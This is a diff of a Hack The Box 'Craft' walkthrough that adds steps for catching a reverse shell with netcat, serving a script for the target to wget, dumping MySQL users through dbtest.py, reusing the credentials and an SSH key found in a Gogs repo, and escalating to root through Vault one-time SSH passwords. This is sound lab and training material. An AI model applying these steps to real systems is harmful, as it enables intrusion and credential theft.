@@ -13,11 +13,7 @@ PORT     STATE SERVICE  REASON  VERSION
 22/tcp   open  ssh      syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
 | ssh-hostkey: 
 |   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
-| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCscULO5kzW5659eWy5BdBJWCHxBSvqKIn6TZwEdp4NG3cLJc6aVQxEUknoSoMa2RAy2CFv/IWKbFIEY33XM2PRhKTuSJd/aNrMKs0jX40q/0zpmRv4/HzLdWE33t9on739xRWgsnNI0JOaGAwa4ryubOeKo53ykP9fTgLeHvT37GthWJIzfXNA7UFXJen3T4+4xmbxA2Low8D8xAGjqVLoEgKGVy05oL+zGucd0C5LyclT0Gkxm3NCk3MLdFdPOuaVX5jlX32yKUA//Go9fN9OlGffcHkLfgTA7s+PLememC14H/r8ZLYJYByeBj2MqR6ndkQ3+OkmSjeOBPEamkqz
-|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJAzk0wAfmy1zhnnnQOEoqLN0OK0zF9VwqqwIRkG58ARwaVlwSARRf3BS7Ywo2AfjZS9EWZycsXxy3/7MwEQS1U=
-|   256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJsBTHLrhy1IfI4AeEWxjJBm9z6wm/F9mMPMUbpRt2+K
+
 443/tcp  open  ssl/http syn-ack nginx 1.15.8
 |_http-server-header: nginx/1.15.8
 | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
@@ -114,7 +110,7 @@ json_data = json.dumps(brew_dict)
 response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
 ```
 
-***Note***: We add 
+***Note***: We add `urllib3`:
 ```
 import urllib3 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -123,3 +119,94 @@ to disable the error certification
 
 + Now run file test.py and open netcat to capture the shell:
 
+![alt text](image-6.png)
+
+![alt text](image-7.png)
+
+### Finding SSH credenials through Mysql database:
++ In the file `settings.py`, we found the credential user of database:
+
+![alt text](image-8.png)
+
+--> We've had `User`, `Password`, `DB`, `Host`.
+
++ Back again the repo `craf-api`, we've check python file `dbtest.py`. We are able to run file .py in the target machine to extract the information of database.
++ Firstly, we will wget file .py in target machine and edit again `dbtest.py`.
+
+```bash
+$ sudo python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.14.5 - - [09/Mar/2025 14:27:13] "GET / HTTP/1.1" 200 -
+10.10.14.5 - - [09/Mar/2025 14:27:13] code 404, message File not found
+10.10.14.5 - - [09/Mar/2025 14:27:13] "GET /favicon.ico HTTP/1.1" 404 -
+10.10.10.110 - - [09/Mar/2025 14:27:22] "GET /dbtest.py HTTP/1.1" 200 -
+```
+
+![alt text](image-9.png)
+
++ We can check file edited:
+```python
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB,
+                             cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "show tables" # Edit query sql to execute which we want
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        print(result)
+
+finally:
+    connection.close()
+```
+***Note***: Because import `pymysql` we can use `fetchall()` - Fetch all the rows. Searching more relate class `pymysql` in [here](https://pymysql.readthedocs.io/en/latest/modules/cursors.html).
+
++ Run `dbtest.py`:
+
+![alt text](image-10.png)
+
++ Now we change query to extract users:
+
+```python
+ with connection.cursor() as cursor:
+        sql = "SELECT * FROM user"
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        print(result)
+```
+
++ Run `dbtest.py` again:
+
+![alt text](image-11.png)
+
+--> We use the credential user `gilfoyle` to login git service `gogs`.
+
++ Login `gogs` we found the gilfoyle's repo name `craft-infra`.
++ Check repo we had key .ssh/id_rsa to login SSH. Save key to machine and login SSH.
+
+![alt text](image-12.png)
+
+### Privilege Escalation:
++ Check again repo `craft-infra`, we've checked secret file `secrets.sh` in /vault.
++ Read it and we guess we can use it to privilege escalation.
+
+![alt text](image-13.png)
+
++ Research about `vault` and `ssh`, we found the way call `One-time SSH passwords`. [Read it!!!](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords).
+
++ We run following `Automate it!` to create a new OTP and invoke SSH with the correct parameters to connect to the host.
+
++ Run CLI and we get the root:
+
+![alt text](image-14.png)
+-----------------------------------------------------------
